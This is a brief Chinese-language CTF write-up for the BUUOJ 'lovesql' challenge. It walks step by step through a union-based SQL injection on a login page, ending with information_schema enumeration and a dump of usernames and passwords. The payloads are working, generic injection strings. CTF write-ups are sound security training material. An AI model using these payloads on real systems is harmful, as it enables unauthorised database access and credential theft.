### buuoj_[极客大挑战 2019]lovesql

进入界面，看了下源代码，没看出什么来，先试一下闭合方式

![](https://pic.imgdb.cn/item/60fac0935132923bf83448e2.jpg)

单引号闭合，试一下万能密码登陆

![](https://pic.imgdb.cn/item/60fac0bd5132923bf834cf6d.jpg)

成功了，测一下字段

```
1' order by 3#
1' order by 4#
```

![](https://pic.imgdb.cn/item/60fac12c5132923bf8362df7.jpg)

一共三个字段，测试一下显示位置

```
1' union select 1,2,3#
```

![](https://pic.imgdb.cn/item/60fac16e5132923bf8370188.jpg)

看这样子就差不多了，一套组合拳

```
1' union select 1,database(),3#-->geek
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema="geek"#
```

![image-20210723212027041](C:\Users\EXCEPTION\AppData\Roaming\Typora\typora-user-images\image-20210723212027041.png)

```
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'
```

![](https://pic.imgdb.cn/item/60fac26d5132923bf83a58e9.jpg)

```
1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
```

![](https://pic.imgdb.cn/item/60fac2d35132923bf83bb221.jpg)

得到flag